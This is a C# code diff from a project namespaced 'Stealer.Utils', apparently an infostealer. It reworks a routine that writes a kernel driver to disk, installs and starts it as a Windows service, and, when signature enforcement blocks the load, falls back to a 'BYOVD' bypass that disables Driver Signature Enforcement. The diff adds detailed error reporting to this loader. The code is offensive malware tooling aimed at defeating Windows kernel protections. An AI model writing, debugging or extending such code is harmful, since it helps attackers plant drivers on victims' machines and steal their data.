@@ -95,8 +95,9 @@ namespace Stealer.Utils
 
         // ── Public API ─────────────────────────────────────────────────────────
 
-        public static bool Load(byte[] sysBytes)
+        public static bool Load(byte[] sysBytes, out string errorMsg)
         {
+            errorMsg = null;
             lock (_lock)
             {
                 if (_loaded) return true;
@@ -108,9 +109,9 @@ namespace Stealer.Utils
                 try
                 {
                     File.WriteAllBytes(sysPath, sysBytes);
-                    if (!InstallAndStart(sysPath))
+                    if (!InstallAndStart(sysPath, out errorMsg))
                     {
-                        File.Delete(sysPath);
+                        try { File.Delete(sysPath); } catch { }
                         return false;
                     }
                     _loaded = true;
@@ -122,7 +123,11 @@ namespace Stealer.Utils
                     catch { }
                     return true;
                 }
-                catch { return false; }
+                catch (Exception ex)
+                {
+                    errorMsg = "Write file or permission error: " + ex.Message;
+                    return false;
+                }
             }
         }
 
@@ -199,10 +204,16 @@ namespace Stealer.Utils
             finally { CloseHandle(h); }
         }
 
-        private static bool InstallAndStart(string sysPath)
+        private static bool InstallAndStart(string sysPath, out string errorMsg)
         {
+            errorMsg = null;
             IntPtr hSCM = OpenSCManager(null, null, SC_MANAGER_ALL);
-            if (hSCM == IntPtr.Zero) return false;
+            if (hSCM == IntPtr.Zero)
+            {
+                int scmErr = Marshal.GetLastWin32Error();
+                errorMsg = scmErr == 5 ? "OpenSCManager failed: Access Denied (Administrator privileges required)" : ("OpenSCManager failed (Win32 error " + scmErr + ")");
+                return false;
+            }
             try
             {
                 // удаляем если уже есть
@@ -222,7 +233,12 @@ namespace Stealer.Utils
                     SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
                     sysPath, null, IntPtr.Zero, null, null, null);
 
-                if (hSvc == IntPtr.Zero) return false;
+                if (hSvc == IntPtr.Zero)
+                {
+                    int cErr = Marshal.GetLastWin32Error();
+                    errorMsg = "CreateService failed (Win32 error " + cErr + ")";
+                    return false;
+                }
                 try
                 {
                     bool ok = StartService(hSvc, 0, null);
@@ -230,7 +246,11 @@ namespace Stealer.Utils
                     if (!ok && err != 1056)
                     {
                         // Fallback: Attempt BYOVD DSE Bypass if signature/DSE enforcement blocked driver load
-                        ok = BYOVDLoader.DisableDSEAndStartService(hSvc);
+                        ok = BYOVDLoader.DisableDSEAndStartService(hSvc, out errorMsg);
+                        if (!ok && string.IsNullOrEmpty(errorMsg))
+                        {
+                            errorMsg = "StartService failed (Win32 error " + err + ") and BYOVD fallback failed";
+                        }
                     }
                     return ok || err == 1056;
                 }
